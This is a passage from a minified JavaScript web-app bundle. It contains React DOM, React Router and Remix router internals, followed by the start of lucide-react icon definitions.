};
Ue.hydrate = function (t, e, n) {
    if (!Zi(e)) throw Error(S(200));
    return eo(null, t, e, !0, n);
};
Ue.hydrateRoot = function (t, e, n) {
    if (!su(t)) throw Error(S(405));
    var r = (n != null && n.hydratedSources) || null,
        s = !1,
        i = "",
        o = mf;
    if (
        (n != null &&
            (n.unstable_strictMode === !0 && (s = !0),
            n.identifierPrefix !== void 0 && (i = n.identifierPrefix),
            n.onRecoverableError !== void 0 && (o = n.onRecoverableError)),
        (e = pf(e, null, t, 1, n ?? null, s, !1, i, o)),
        (t[kt] = e.current),
        rs(t),
        r)
    )
        for (t = 0; t < r.length; t++)
            (n = r[t]),
                (s = n._getVersion),
                (s = s(n._source)),
                e.mutableSourceEagerHydrationData == null
                    ? (e.mutableSourceEagerHydrationData = [n, s])
                    : e.mutableSourceEagerHydrationData.push(n, s);
    return new Yi(e);
};
Ue.render = function (t, e, n) {
    if (!Zi(e)) throw Error(S(200));
    return eo(null, t, e, !1, n);
};
Ue.unmountComponentAtNode = function (t) {
    if (!Zi(t)) throw Error(S(40));
    return t._reactRootContainer
        ? (jn(function () {
              eo(null, null, t, !1, function () {
                  (t._reactRootContainer = null), (t[kt] = null);
              });
          }),
          !0)
        : !1;
};
Ue.unstable_batchedUpdates = Xl;
Ue.unstable_renderSubtreeIntoContainer = function (t, e, n, r) {
    if (!Zi(n)) throw Error(S(200));
    if (t == null || t._reactInternals === void 0) throw Error(S(38));
    return eo(t, e, n, !1, r);
};
Ue.version = "18.3.1-next-f1338f8080-20240426";
function gf() {
    if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function"))
        try {
            __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(gf);
        } catch (t) {
            console.error(t);
        }
}
gf(), (md.exports = Ue);
var W0 = md.exports,
    vf,
    Nc = W0;
(vf = Nc.createRoot), Nc.hydrateRoot;
/**
 * @remix-run/router v1.23.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */ function hs() {
    return (
        (hs = Object.assign
            ? Object.assign.bind()
            : function (t) {
                  for (var e = 1; e < arguments.length; e++) {
                      var n = arguments[e];
                      for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (t[r] = n[r]);
                  }
                  return t;
              }),
        hs.apply(this, arguments)
    );
}
var Bt;
(function (t) {
    (t.Pop = "POP"), (t.Push = "PUSH"), (t.Replace = "REPLACE");
})(Bt || (Bt = {}));
const Cc = "popstate";
function H0(t) {
    t === void 0 && (t = {});
    function e(r, s) {
        let { pathname: i, search: o, hash: a } = r.location;
        return Ja(
            "",
            { pathname: i, search: o, hash: a },
            (s.state && s.state.usr) || null,
            (s.state && s.state.key) || "default"
        );
    }
    function n(r, s) {
        return typeof s == "string" ? s : yf(s);
    }
    return G0(e, n, null, t);
}
function ne(t, e) {
    if (t === !1 || t === null || typeof t > "u") throw new Error(e);
}
function iu(t, e) {
    if (!t) {
        typeof console < "u" && console.warn(e);
        try {
            throw new Error(e);
        } catch {}
    }
}
function q0() {
    return Math.random().toString(36).substr(2, 8);
}
function Pc(t, e) {
    return { usr: t.state, key: t.key, idx: e };
}
function Ja(t, e, n, r) {
    return (
        n === void 0 && (n = null),
        hs(
            { pathname: typeof t == "string" ? t : t.pathname, search: "", hash: "" },
            typeof e == "string" ? mr(e) : e,
            { state: n, key: (e && e.key) || r || q0() }
        )
    );
}
function yf(t) {
    let { pathname: e = "/", search: n = "", hash: r = "" } = t;
    return (
        n && n !== "?" && (e += n.charAt(0) === "?" ? n : "?" + n),
        r && r !== "#" && (e += r.charAt(0) === "#" ? r : "#" + r),
        e
    );
}
function mr(t) {
    let e = {};
    if (t) {
        let n = t.indexOf("#");
        n >= 0 && ((e.hash = t.substr(n)), (t = t.substr(0, n)));
        let r = t.indexOf("?");
        r >= 0 && ((e.search = t.substr(r)), (t = t.substr(0, r))), t && (e.pathname = t);
    }
    return e;
}
function G0(t, e, n, r) {
    r === void 0 && (r = {});
    let { window: s = document.defaultView, v5Compat: i = !1 } = r,
        o = s.history,
        a = Bt.Pop,
        l = null,
        c = d();
    c == null && ((c = 0), o.replaceState(hs({}, o.state, { idx: c }), ""));
    function d() {
        return (o.state || { idx: null }).idx;
    }
    function h() {
        a = Bt.Pop;
        let b = d(),
            g = b == null ? null : b - c;
        (c = b), l && l({ action: a, location: _.location, delta: g });
    }
    function f(b, g) {
        a = Bt.Push;
        let p = Ja(_.location, b, g);
        c = d() + 1;
        let m = Pc(p, c),
            w = _.createHref(p);
        try {
            o.pushState(m, "", w);
        } catch (k) {
            if (k instanceof DOMException && k.name === "DataCloneError") throw k;
            s.location.assign(w);
        }
        i && l && l({ action: a, location: _.location, delta: 1 });
    }
    function v(b, g) {
        a = Bt.Replace;
        let p = Ja(_.location, b, g);
        c = d();
        let m = Pc(p, c),
            w = _.createHref(p);
        o.replaceState(m, "", w), i && l && l({ action: a, location: _.location, delta: 0 });
    }
    function y(b) {
        let g = s.location.origin !== "null" ? s.location.origin : s.location.href,
            p = typeof b == "string" ? b : yf(b);
        return (
            (p = p.replace(/ $/, "%20")),
            ne(g, "No window.location.(origin|href) available to create URL for href: " + p),
            new URL(p, g)
        );
    }
    let _ = {
        get action() {
            return a;
        },
        get location() {
            return t(s, o);
        },
        listen(b) {
            if (l) throw new Error("A history only accepts one active listener");
            return (
                s.addEventListener(Cc, h),
                (l = b),
                () => {
                    s.removeEventListener(Cc, h), (l = null);
                }
            );
        },
        createHref(b) {
            return e(s, b);
        },
        createURL: y,
        encodeLocation(b) {
            let g = y(b);
            return { pathname: g.pathname, search: g.search, hash: g.hash };
        },
        push: f,
        replace: v,
        go(b) {
            return o.go(b);
        },
    };
    return _;
}
var Tc;
(function (t) {
    (t.data = "data"), (t.deferred = "deferred"), (t.redirect = "redirect"), (t.error = "error");
})(Tc || (Tc = {}));
function K0(t, e, n) {
    return n === void 0 && (n = "/"), Q0(t, e, n, !1);
}
function Q0(t, e, n, r) {
    let s = typeof e == "string" ? mr(e) : e,
        i = _f(s.pathname || "/", n);
    if (i == null) return null;
    let o = xf(t);
    J0(o);
    let a = null;
    for (let l = 0; a == null && l < o.length; ++l) {
        let c = ag(i);
        a = ig(o[l], c, r);
    }
    return a;
}
function xf(t, e, n, r) {
    e === void 0 && (e = []), n === void 0 && (n = []), r === void 0 && (r = "");
    let s = (i, o, a) => {
        let l = {
            relativePath: a === void 0 ? i.path || "" : a,
            caseSensitive: i.caseSensitive === !0,
            childrenIndex: o,
            route: i,
        };
        l.relativePath.startsWith("/") &&
            (ne(
                l.relativePath.startsWith(r),
                'Absolute route path "' +
                    l.relativePath +
                    '" nested under path ' +
                    ('"' + r + '" is not valid. An absolute child route path ') +
                    "must start with the combined path of all its parent routes."
            ),
            (l.relativePath = l.relativePath.slice(r.length)));
        let c = wn([r, l.relativePath]),
            d = n.concat(l);
        i.children &&
            i.children.length > 0 &&
            (ne(
                i.index !== !0,
                "Index routes must not have child routes. Please remove " +
                    ('all child routes from route path "' + c + '".')
            ),
            xf(i.children, e, d, c)),
            !(i.path == null && !i.index) && e.push({ path: c, score: rg(c, i.index), routesMeta: d });
    };
    return (
        t.forEach((i, o) => {
            var a;
            if (i.path === "" || !((a = i.path) != null && a.includes("?"))) s(i, o);
            else for (let l of wf(i.path)) s(i, o, l);
        }),
        e
    );
}
function wf(t) {
    let e = t.split("/");
    if (e.length === 0) return [];
    let [n, ...r] = e,
        s = n.endsWith("?"),
        i = n.replace(/\?$/, "");
    if (r.length === 0) return s ? [i, ""] : [i];
    let o = wf(r.join("/")),
        a = [];
    return (
        a.push(...o.map((l) => (l === "" ? i : [i, l].join("/")))),
        s && a.push(...o),
        a.map((l) => (t.startsWith("/") && l === "" ? "/" : l))
    );
}
function J0(t) {
    t.sort((e, n) =>
        e.score !== n.score
            ? n.score - e.score
            : sg(
                  e.routesMeta.map((r) => r.childrenIndex),
                  n.routesMeta.map((r) => r.childrenIndex)
              )
    );
}
const X0 = /^:[\w-]+$/,
    Y0 = 3,
    Z0 = 2,
    eg = 1,
    tg = 10,
    ng = -2,
    Rc = (t) => t === "*";
function rg(t, e) {
    let n = t.split("/"),
        r = n.length;
    return (
        n.some(Rc) && (r += ng),
        e && (r += Z0),
        n.filter((s) => !Rc(s)).reduce((s, i) => s + (X0.test(i) ? Y0 : i === "" ? eg : tg), r)
    );
}
function sg(t, e) {
    return t.length === e.length && t.slice(0, -1).every((r, s) => r === e[s]) ? t[t.length - 1] - e[e.length - 1] : 0;
}
function ig(t, e, n) {
    let { routesMeta: r } = t,
        s = {},
        i = "/",
        o = [];
    for (let a = 0; a < r.length; ++a) {
        let l = r[a],
            c = a === r.length - 1,
            d = i === "/" ? e : e.slice(i.length) || "/",
            h = Oc({ path: l.relativePath, caseSensitive: l.caseSensitive, end: c }, d),
            f = l.route;
        if (
            (!h &&
                c &&
                n &&
                !r[r.length - 1].route.index &&
                (h = Oc({ path: l.relativePath, caseSensitive: l.caseSensitive, end: !1 }, d)),
            !h)
        )
            return null;
        Object.assign(s, h.params),
            o.push({ params: s, pathname: wn([i, h.pathname]), pathnameBase: hg(wn([i, h.pathnameBase])), route: f }),
            h.pathnameBase !== "/" && (i = wn([i, h.pathnameBase]));
    }
    return o;
}
function Oc(t, e) {
    typeof t == "string" && (t = { path: t, caseSensitive: !1, end: !0 });
    let [n, r] = og(t.path, t.caseSensitive, t.end),
        s = e.match(n);
    if (!s) return null;
    let i = s[0],
        o = i.replace(/(.)\/+$/, "$1"),
        a = s.slice(1);
    return {
        params: r.reduce((c, d, h) => {
            let { paramName: f, isOptional: v } = d;
            if (f === "*") {
                let _ = a[h] || "";
                o = i.slice(0, i.length - _.length).replace(/(.)\/+$/, "$1");
            }
            const y = a[h];
            return v && !y ? (c[f] = void 0) : (c[f] = (y || "").replace(/%2F/g, "/")), c;
        }, {}),
        pathname: i,
        pathnameBase: o,
        pattern: t,
    };
}
function og(t, e, n) {
    e === void 0 && (e = !1),
        n === void 0 && (n = !0),
        iu(
            t === "*" || !t.endsWith("*") || t.endsWith("/*"),
            'Route path "' +
                t +
                '" will be treated as if it were ' +
                ('"' + t.replace(/\*$/, "/*") + '" because the `*` character must ') +
                "always follow a `/` in the pattern. To get rid of this warning, " +
                ('please change the route path to "' + t.replace(/\*$/, "/*") + '".')
        );
    let r = [],
        s =
            "^" +
            t
                .replace(/\/*\*?$/, "")
                .replace(/^\/*/, "/")
                .replace(/[\\.*+^${}|()[\]]/g, "\\$&")
                .replace(
                    /\/:([\w-]+)(\?)?/g,
                    (o, a, l) => (r.push({ paramName: a, isOptional: l != null }), l ? "/?([^\\/]+)?" : "/([^\\/]+)")
                );
    return (
        t.endsWith("*")
            ? (r.push({ paramName: "*" }), (s += t === "*" || t === "/*" ? "(.*)$" : "(?:\\/(.+)|\\/*)$"))
            : n
              ? (s += "\\/*$")
              : t !== "" && t !== "/" && (s += "(?:(?=\\/|$))"),
        [new RegExp(s, e ? void 0 : "i"), r]
    );
}
function ag(t) {
    try {
        return t
            .split("/")
            .map((e) => decodeURIComponent(e).replace(/\//g, "%2F"))
            .join("/");
    } catch (e) {
        return (
            iu(
                !1,
                'The URL path "' +
                    t +
                    '" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent ' +
                    ("encoding (" + e + ").")
            ),
            t
        );
    }
}
function _f(t, e) {
    if (e === "/") return t;
    if (!t.toLowerCase().startsWith(e.toLowerCase())) return null;
    let n = e.endsWith("/") ? e.length - 1 : e.length,
        r = t.charAt(n);
    return r && r !== "/" ? null : t.slice(n) || "/";
}
const lg = /^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,
    ug = (t) => lg.test(t);
function cg(t, e) {
    e === void 0 && (e = "/");
    let { pathname: n, search: r = "", hash: s = "" } = typeof t == "string" ? mr(t) : t,
        i;
    if (n)
        if (ug(n)) i = n;
        else {
            if (n.includes("//")) {
                let o = n;
                (n = n.replace(/\/\/+/g, "/")),
                    iu(!1, "Pathnames cannot have embedded double slashes - normalizing " + (o + " -> " + n));
            }
            n.startsWith("/") ? (i = $c(n.substring(1), "/")) : (i = $c(n, e));
        }
    else i = e;
    return { pathname: i, search: fg(r), hash: pg(s) };
}
function $c(t, e) {
    let n = e.replace(/\/+$/, "").split("/");
    return (
        t.split("/").forEach((s) => {
            s === ".." ? n.length > 1 && n.pop() : s !== "." && n.push(s);
        }),
        n.length > 1 ? n.join("/") : "/"
    );
}
function Vo(t, e, n, r) {
    return (
        "Cannot include a '" +
        t +
        "' character in a manually specified " +
        ("`to." + e + "` field [" + JSON.stringify(r) + "].  Please separate it out to the ") +
        ("`to." + n + "` field. Alternatively you may provide the full path as ") +
        'a string in <Link to="..."> and the router will parse it for you.'
    );
}
function dg(t) {
    return t.filter((e, n) => n === 0 || (e.route.path && e.route.path.length > 0));
}
function bf(t, e) {
    let n = dg(t);
    return e ? n.map((r, s) => (s === n.length - 1 ? r.pathname : r.pathnameBase)) : n.map((r) => r.pathnameBase);
}
function kf(t, e, n, r) {
    r === void 0 && (r = !1);
    let s;
    typeof t == "string"
        ? (s = mr(t))
        : ((s = hs({}, t)),
          ne(!s.pathname || !s.pathname.includes("?"), Vo("?", "pathname", "search", s)),
          ne(!s.pathname || !s.pathname.includes("#"), Vo("#", "pathname", "hash", s)),
          ne(!s.search || !s.search.includes("#"), Vo("#", "search", "hash", s)));
    let i = t === "" || s.pathname === "",
        o = i ? "/" : s.pathname,
        a;
    if (o == null) a = n;
    else {
        let h = e.length - 1;
        if (!r && o.startsWith("..")) {
            let f = o.split("/");
            for (; f[0] === ".."; ) f.shift(), (h -= 1);
            s.pathname = f.join("/");
        }
        a = h >= 0 ? e[h] : "/";
    }
    let l = cg(s, a),
        c = o && o !== "/" && o.endsWith("/"),
        d = (i || o === ".") && n.endsWith("/");
    return !l.pathname.endsWith("/") && (c || d) && (l.pathname += "/"), l;
}
const wn = (t) => t.join("/").replace(/\/\/+/g, "/"),
    hg = (t) => t.replace(/\/+$/, "").replace(/^\/*/, "/"),
    fg = (t) => (!t || t === "?" ? "" : t.startsWith("?") ? t : "?" + t),
    pg = (t) => (!t || t === "#" ? "" : t.startsWith("#") ? t : "#" + t);
function mg(t) {
    return (
        t != null &&
        typeof t.status == "number" &&
        typeof t.statusText == "string" &&
        typeof t.internal == "boolean" &&
        "data" in t
    );
}
const Sf = ["post", "put", "patch", "delete"];
new Set(Sf);
const gg = ["get", ...Sf];
new Set(gg);
/**
 * React Router v6.30.3
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */ function fs() {
    return (
        (fs = Object.assign
            ? Object.assign.bind()
            : function (t) {
                  for (var e = 1; e < arguments.length; e++) {
                      var n = arguments[e];
                      for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (t[r] = n[r]);
                  }
                  return t;
              }),
        fs.apply(this, arguments)
    );
}
const ou = x.createContext(null),
    vg = x.createContext(null),
    ws = x.createContext(null),
    to = x.createContext(null),
    Cn = x.createContext({ outlet: null, matches: [], isDataRoute: !1 }),
    jf = x.createContext(null);
function _s() {
    return x.useContext(to) != null;
}
function au() {
    return _s() || ne(!1), x.useContext(to).location;
}
function Ef(t) {
    x.useContext(ws).static || x.useLayoutEffect(t);
}
function Nf() {
    let { isDataRoute: t } = x.useContext(Cn);
    return t ? Tg() : yg();
}
function yg() {
    _s() || ne(!1);
    let t = x.useContext(ou),
        { basename: e, future: n, navigator: r } = x.useContext(ws),
        { matches: s } = x.useContext(Cn),
        { pathname: i } = au(),
        o = JSON.stringify(bf(s, n.v7_relativeSplatPath)),
        a = x.useRef(!1);
    return (
        Ef(() => {
            a.current = !0;
        }),
        x.useCallback(
            function (c, d) {
                if ((d === void 0 && (d = {}), !a.current)) return;
                if (typeof c == "number") {
                    r.go(c);
                    return;
                }
                let h = kf(c, JSON.parse(o), i, d.relative === "path");
                t == null && e !== "/" && (h.pathname = h.pathname === "/" ? e : wn([e, h.pathname])),
                    (d.replace ? r.replace : r.push)(h, d.state, d);
            },
            [e, r, o, i, t]
        )
    );
}
function xg(t, e) {
    return wg(t, e);
}
function wg(t, e, n, r) {
    _s() || ne(!1);
    let { navigator: s } = x.useContext(ws),
        { matches: i } = x.useContext(Cn),
        o = i[i.length - 1],
        a = o ? o.params : {};
    o && o.pathname;
    let l = o ? o.pathnameBase : "/";
    o && o.route;
    let c = au(),
        d;
    if (e) {
        var h;
        let b = typeof e == "string" ? mr(e) : e;
        l === "/" || ((h = b.pathname) != null && h.startsWith(l)) || ne(!1), (d = b);
    } else d = c;
    let f = d.pathname || "/",
        v = f;
    if (l !== "/") {
        let b = l.replace(/^\//, "").split("/");
        v = "/" + f.replace(/^\//, "").split("/").slice(b.length).join("/");
    }
    let y = K0(t, { pathname: v }),
        _ = jg(
            y &&
                y.map((b) =>
                    Object.assign({}, b, {
                        params: Object.assign({}, a, b.params),
                        pathname: wn([l, s.encodeLocation ? s.encodeLocation(b.pathname).pathname : b.pathname]),
                        pathnameBase:
                            b.pathnameBase === "/"
                                ? l
                                : wn([
                                      l,
                                      s.encodeLocation ? s.encodeLocation(b.pathnameBase).pathname : b.pathnameBase,
                                  ]),
                    })
                ),
            i,
            n,
            r
        );
    return e && _
        ? x.createElement(
              to.Provider,
              {
                  value: {
                      location: fs({ pathname: "/", search: "", hash: "", state: null, key: "default" }, d),
                      navigationType: Bt.Pop,
                  },
              },
              _
          )
        : _;
}
function _g() {
    let t = Pg(),
        e = mg(t) ? t.status + " " + t.statusText : t instanceof Error ? t.message : JSON.stringify(t),
        n = t instanceof Error ? t.stack : null,
        s = { padding: "0.5rem", backgroundColor: "rgba(200,200,200, 0.5)" };
    return x.createElement(
        x.Fragment,
        null,
        x.createElement("h2", null, "Unexpected Application Error!"),
        x.createElement("h3", { style: { fontStyle: "italic" } }, e),
        n ? x.createElement("pre", { style: s }, n) : null,
        null
    );
}
const bg = x.createElement(_g, null);
class kg extends x.Component {
    constructor(e) {
        super(e), (this.state = { location: e.location, revalidation: e.revalidation, error: e.error });
    }
    static getDerivedStateFromError(e) {
        return { error: e };
    }
    static getDerivedStateFromProps(e, n) {
        return n.location !== e.location || (n.revalidation !== "idle" && e.revalidation === "idle")
            ? { error: e.error, location: e.location, revalidation: e.revalidation }
            : {
                  error: e.error !== void 0 ? e.error : n.error,
                  location: n.location,
                  revalidation: e.revalidation || n.revalidation,
              };
    }
    componentDidCatch(e, n) {
        console.error("React Router caught the following error during render", e, n);
    }
    render() {
        return this.state.error !== void 0
            ? x.createElement(
                  Cn.Provider,
                  { value: this.props.routeContext },
                  x.createElement(jf.Provider, { value: this.state.error, children: this.props.component })
              )
            : this.props.children;
    }
}
function Sg(t) {
    let { routeContext: e, match: n, children: r } = t,
        s = x.useContext(ou);
    return (
        s &&
            s.static &&
            s.staticContext &&
            (n.route.errorElement || n.route.ErrorBoundary) &&
            (s.staticContext._deepestRenderedBoundaryId = n.route.id),
        x.createElement(Cn.Provider, { value: e }, r)
    );
}
function jg(t, e, n, r) {
    var s;
    if ((e === void 0 && (e = []), n === void 0 && (n = null), r === void 0 && (r = null), t == null)) {
        var i;
        if (!n) return null;
        if (n.errors) t = n.matches;
        else if ((i = r) != null && i.v7_partialHydration && e.length === 0 && !n.initialized && n.matches.length > 0)
            t = n.matches;
        else return null;
    }
    let o = t,
        a = (s = n) == null ? void 0 : s.errors;
    if (a != null) {
        let d = o.findIndex((h) => h.route.id && (a == null ? void 0 : a[h.route.id]) !== void 0);
        d >= 0 || ne(!1), (o = o.slice(0, Math.min(o.length, d + 1)));
    }
    let l = !1,
        c = -1;
    if (n && r && r.v7_partialHydration)
        for (let d = 0; d < o.length; d++) {
            let h = o[d];
            if (((h.route.HydrateFallback || h.route.hydrateFallbackElement) && (c = d), h.route.id)) {
                let { loaderData: f, errors: v } = n,
                    y = h.route.loader && f[h.route.id] === void 0 && (!v || v[h.route.id] === void 0);
                if (h.route.lazy || y) {
                    (l = !0), c >= 0 ? (o = o.slice(0, c + 1)) : (o = [o[0]]);
                    break;
                }
            }
        }
    return o.reduceRight((d, h, f) => {
        let v,
            y = !1,
            _ = null,
            b = null;
        n &&
            ((v = a && h.route.id ? a[h.route.id] : void 0),
            (_ = h.route.errorElement || bg),
            l &&
                (c < 0 && f === 0
                    ? ((y = !0), (b = null))
                    : c === f && ((y = !0), (b = h.route.hydrateFallbackElement || null))));
        let g = e.concat(o.slice(0, f + 1)),
            p = () => {
                let m;
                return (
                    v
                        ? (m = _)
                        : y
                          ? (m = b)
                          : h.route.Component
                            ? (m = x.createElement(h.route.Component, null))
                            : h.route.element
                              ? (m = h.route.element)
                              : (m = d),
                    x.createElement(Sg, {
                        match: h,
                        routeContext: { outlet: d, matches: g, isDataRoute: n != null },
                        children: m,
                    })
                );
            };
        return n && (h.route.ErrorBoundary || h.route.errorElement || f === 0)
            ? x.createElement(kg, {
                  location: n.location,
                  revalidation: n.revalidation,
                  component: _,
                  error: v,
                  children: p(),
                  routeContext: { outlet: null, matches: g, isDataRoute: !0 },
              })
            : p();
    }, null);
}
var Cf = (function (t) {
        return (
            (t.UseBlocker = "useBlocker"),
            (t.UseRevalidator = "useRevalidator"),
            (t.UseNavigateStable = "useNavigate"),
            t
        );
    })(Cf || {}),
    Ii = (function (t) {
        return (
            (t.UseBlocker = "useBlocker"),
            (t.UseLoaderData = "useLoaderData"),
            (t.UseActionData = "useActionData"),
            (t.UseRouteError = "useRouteError"),
            (t.UseNavigation = "useNavigation"),
            (t.UseRouteLoaderData = "useRouteLoaderData"),
            (t.UseMatches = "useMatches"),
            (t.UseRevalidator = "useRevalidator"),
            (t.UseNavigateStable = "useNavigate"),
            (t.UseRouteId = "useRouteId"),
            t
        );
    })(Ii || {});
function Eg(t) {
    let e = x.useContext(ou);
    return e || ne(!1), e;
}
function Ng(t) {
    let e = x.useContext(vg);
    return e || ne(!1), e;
}
function Cg(t) {
    let e = x.useContext(Cn);
    return e || ne(!1), e;
}
function Pf(t) {
    let e = Cg(),
        n = e.matches[e.matches.length - 1];
    return n.route.id || ne(!1), n.route.id;
}
function Pg() {
    var t;
    let e = x.useContext(jf),
        n = Ng(Ii.UseRouteError),
        r = Pf(Ii.UseRouteError);
    return e !== void 0 ? e : (t = n.errors) == null ? void 0 : t[r];
}
function Tg() {
    let { router: t } = Eg(Cf.UseNavigateStable),
        e = Pf(Ii.UseNavigateStable),
        n = x.useRef(!1);
    return (
        Ef(() => {
            n.current = !0;
        }),
        x.useCallback(
            function (s, i) {
                i === void 0 && (i = {}),
                    n.current && (typeof s == "number" ? t.navigate(s) : t.navigate(s, fs({ fromRouteId: e }, i)));
            },
            [t, e]
        )
    );
}
function Rg(t, e) {
    t == null || t.v7_startTransition, t == null || t.v7_relativeSplatPath;
}
function Og(t) {
    let { to: e, replace: n, state: r, relative: s } = t;
    _s() || ne(!1);
    let { future: i, static: o } = x.useContext(ws),
        { matches: a } = x.useContext(Cn),
        { pathname: l } = au(),
        c = Nf(),
        d = kf(e, bf(a, i.v7_relativeSplatPath), l, s === "path"),
        h = JSON.stringify(d);
    return x.useEffect(() => c(JSON.parse(h), { replace: n, state: r, relative: s }), [c, h, s, n, r]), null;
}
function ai(t) {
    ne(!1);
}
function $g(t) {
    let {
        basename: e = "/",
        children: n = null,
        location: r,
        navigationType: s = Bt.Pop,
        navigator: i,
        static: o = !1,
        future: a,
    } = t;
    _s() && ne(!1);
    let l = e.replace(/^\/*/, "/"),
        c = x.useMemo(
            () => ({ basename: l, navigator: i, static: o, future: fs({ v7_relativeSplatPath: !1 }, a) }),
            [l, a, i, o]
        );
    typeof r == "string" && (r = mr(r));
    let { pathname: d = "/", search: h = "", hash: f = "", state: v = null, key: y = "default" } = r,
        _ = x.useMemo(() => {
            let b = _f(d, l);
            return b == null
                ? null
                : { location: { pathname: b, search: h, hash: f, state: v, key: y }, navigationType: s };
        }, [l, d, h, f, v, y, s]);
    return _ == null
        ? null
        : x.createElement(ws.Provider, { value: c }, x.createElement(to.Provider, { children: n, value: _ }));
}
function Ig(t) {
    let { children: e, location: n } = t;
    return xg(Xa(e), n);
}
new Promise(() => {});
function Xa(t, e) {
    e === void 0 && (e = []);
    let n = [];
    return (
        x.Children.forEach(t, (r, s) => {
            if (!x.isValidElement(r)) return;
            let i = [...e, s];
            if (r.type === x.Fragment) {
                n.push.apply(n, Xa(r.props.children, i));
                return;
            }
            r.type !== ai && ne(!1), !r.props.index || !r.props.children || ne(!1);
            let o = {
                id: r.props.id || i.join("-"),
                caseSensitive: r.props.caseSensitive,
                element: r.props.element,
                Component: r.props.Component,
                index: r.props.index,
                path: r.props.path,
                loader: r.props.loader,
                action: r.props.action,
                errorElement: r.props.errorElement,
                ErrorBoundary: r.props.ErrorBoundary,
                hasErrorBoundary: r.props.ErrorBoundary != null || r.props.errorElement != null,
                shouldRevalidate: r.props.shouldRevalidate,
                handle: r.props.handle,
                lazy: r.props.lazy,
            };
            r.props.children && (o.children = Xa(r.props.children, i)), n.push(o);
        }),
        n
    );
}
/**
 * React Router DOM v6.30.3
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */ const Ag = "6";
try {
    window.__reactRouterVersion = Ag;
} catch {}
const Lg = "startTransition",
    Ic = $p[Lg];
function Mg(t) {
    let { basename: e, children: n, future: r, window: s } = t,
        i = x.useRef();
    i.current == null && (i.current = H0({ window: s, v5Compat: !0 }));
    let o = i.current,
        [a, l] = x.useState({ action: o.action, location: o.location }),
        { v7_startTransition: c } = r || {},
        d = x.useCallback(
            (h) => {
                c && Ic ? Ic(() => l(h)) : l(h);
            },
            [l, c]
        );
    return (
        x.useLayoutEffect(() => o.listen(d), [o, d]),
        x.useEffect(() => Rg(r), [r]),
        x.createElement($g, {
            basename: e,
            children: n,
            location: a.location,
            navigationType: a.action,
            navigator: o,
            future: r,
        })
    );
}
var Ac;
(function (t) {
    (t.UseScrollRestoration = "useScrollRestoration"),
        (t.UseSubmit = "useSubmit"),
        (t.UseSubmitFetcher = "useSubmitFetcher"),
        (t.UseFetcher = "useFetcher"),
        (t.useViewTransitionState = "useViewTransitionState");
})(Ac || (Ac = {}));
var Lc;
(function (t) {
    (t.UseFetcher = "useFetcher"), (t.UseFetchers = "useFetchers"), (t.UseScrollRestoration = "useScrollRestoration");
})(Lc || (Lc = {}));
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ var Ug = {
    xmlns: "http://www.w3.org/2000/svg",
    width: 24,
    height: 24,
    viewBox: "0 0 24 24",
    fill: "none",
    stroke: "currentColor",
    strokeWidth: 2,
    strokeLinecap: "round",
    strokeLinejoin: "round",
};
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Dg = (t) =>
        t
            .replace(/([a-z0-9])([A-Z])/g, "$1-$2")
            .toLowerCase()
            .trim(),
    he = (t, e) => {
        const n = x.forwardRef(
            (
                {
                    color: r = "currentColor",
                    size: s = 24,
                    strokeWidth: i = 2,
                    absoluteStrokeWidth: o,
                    className: a = "",
                    children: l,
                    ...c
                },
                d
            ) =>
                x.createElement(
                    "svg",
                    {
                        ref: d,
                        ...Ug,
                        width: s,
                        height: s,
                        stroke: r,
                        strokeWidth: o ? (Number(i) * 24) / Number(s) : i,
                        className: ["lucide", `lucide-${Dg(t)}`, a].join(" "),
                        ...c,
                    },
                    [...e.map(([h, f]) => x.createElement(h, f)), ...(Array.isArray(l) ? l : [l])]
                )
        );
        return (n.displayName = `${t}`), n;
    };
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const zg = he("ArrowRight", [
    ["path", { d: "M5 12h14", key: "1ays0h" }],
    ["path", { d: "m12 5 7 7-7 7", key: "xquz4c" }],
]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Fg = he("BadgeCheck", [
    [
        "path",
        {
            d: "M3.85 8.62a4 4 0 0 1 4.78-4.77 4 4 0 0 1 6.74 0 4 4 0 0 1 4.78 4.78 4 4 0 0 1 0 6.74 4 4 0 0 1-4.77 4.78 4 4 0 0 1-6.75 0 4 4 0 0 1-4.78-4.77 4 4 0 0 1 0-6.76Z",
            key: "3c2336",
        },
    ],
    ["path", { d: "m9 12 2 2 4-4", key: "dzmm74" }],
]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Bg = he("ChevronDown", [["path", { d: "m6 9 6 6 6-6", key: "qrunsl" }]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const no = he("ChevronRight", [["path", { d: "m9 18 6-6-6-6", key: "mthhwq" }]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Vg = he("Clock", [
    ["circle", { cx: "12", cy: "12", r: "10", key: "1mglay" }],
    ["polyline", { points: "12 6 12 12 16 14", key: "68esgv" }],
]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Wg = he("Landmark", [
